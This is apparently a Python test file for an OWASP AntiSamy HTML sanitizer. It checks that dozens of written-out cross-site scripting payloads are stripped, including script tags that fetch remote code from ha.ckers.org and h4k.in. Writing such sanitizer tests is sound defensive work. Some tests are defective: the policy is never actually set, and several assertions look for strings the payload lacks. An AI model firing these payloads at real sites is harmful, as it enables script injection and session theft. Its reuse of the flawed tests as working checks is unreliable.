from nose.tools import assert_true, with_setup
from owasp.antisamy.policy import Policy
from owasp.antisamy.scanner import scan

policy = None

def setup_func():
    print 'Initializing policy'
    policy = Policy()

def teardown_func():
    pass

@with_setup(setup_func, teardown_func)
def test_style_and_link():
	assert_true( scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS')\">", policy).clean_html.indexOf("href") == -1 )
	assert_true( scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", policy).clean_html.indexOf("href") == -1 )
	assert_true( scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", policy).clean_html.indexOf("ha.ckers.org") == -1 )
	assert_true( scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy).clean_html.indexOf("ha.ckers.org") == -1 )
	assert_true( scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy).clean_html.indexOf("xss.htc") == -1 )
	assert_true( scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\")}</STYLE><UL><LI>XSS", policy).clean_html.indexOf("javascript") == -1 )
	assert_true( scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy).clean_html.indexOf("ript:alert") == -1 )

@with_setup(setup_func, teardown_func)
def test_img():
	assert_true( scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>", policy).clean_html.indexOf("vbscript") == -1 )

@with_setup(setup_func, teardown_func)
def test_meta():
	assert_true( scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS')\">", policy).clean_html.indexOf("<meta") == -1 )
	assert_true( scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS')\">", policy).clean_html.indexOf("<meta") == -1 )
	assert_true( scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">", policy).clean_html.indexOf("<meta") == -1 )

@with_setup(setup_func, teardown_func)
def test_frame():
	assert_true( scan("<IFRAME SRC=\"javascript:alert('XSS')\"></IFRAME>", policy).clean_html.indexOf("iframe") == -1 )
	assert_true( scan("<FRAMESET><FRAME SRC=\"javascript:alert('XSS')\"></FRAMESET>", policy).clean_html.indexOf("javascript") == -1 )

@with_setup(setup_func, teardown_func)
def test_inline_style():
	assert_true( scan("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", policy).clean_html.indexOf("background") == -1 )
	assert_true( scan("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", policy).clean_html.indexOf("background") == -1 )
	assert_true( scan("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", policy).clean_html.indexOf("javascript") == -1 )
	assert_true( scan("<DIV STYLE=\"width: expression(alert('XSS'))\">", policy).clean_html.indexOf("alert") == -1 )
	assert_true( scan("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", policy).clean_html.indexOf("alert") == -1 )

@with_setup(setup_func, teardown_func)
def test_base_tag():
	assert_true( scan("<BASE HREF=\"javascript:alert('XSS')//\">", policy).clean_html.indexOf("javascript") == -1 )
	assert_true( scan("<BaSe hReF=\"http://arbitrary.com/\">", policy).clean_html.indexOf("<base") == -1 )

@with_setup(setup_func, teardown_func)
def test_embed():
	assert_true( scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>", policy).clean_html.indexOf("<object") == -1 )
	assert_true( scan("<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>", policy).clean_html.indexOf("<object") == -1 )
	assert_true( scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy).clean_html.indexOf("<embed") == -1 )
	assert_true( scan("<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>", policy).clean_html.indexOf("<embed") == -1 )

@with_setup(setup_func, teardown_func)
def test_script():
	assert_true( scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).clean_html.indexOf("<script") == -1 )
	assert_true( scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).clean_html.indexOf("<script") == -1 )
	assert_true( scan("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).clean_html.indexOf("<script") == -1 )
	assert_true( scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).clean_html.indexOf("<script") == -1 )
	assert_true( scan("<SCRIPT>document.write(\"<SCRI\")</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy).clean_html.indexOf("script") == -1 )
	assert_true( scan("<SCRIPT SRC=http://ha.ckers.org/xss.js", policy).clean_html.indexOf("<script") == -1 )

@with_setup(setup_func, teardown_func)
def test_div_entity_encded():
	assert_true( scan("<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>", policy).clean_html.indexOf("style") == -1 )

@with_setup(setup_func, teardown_func)
def test_protocols():
	assert_true( scan("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>", policy).clean_html.indexOf("aim.exe") == -1 )
	assert_true( scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", policy).clean_html.indexOf("javascript") == -1 )
	assert_true( scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">", policy).clean_html.indexOf("document") == -1 )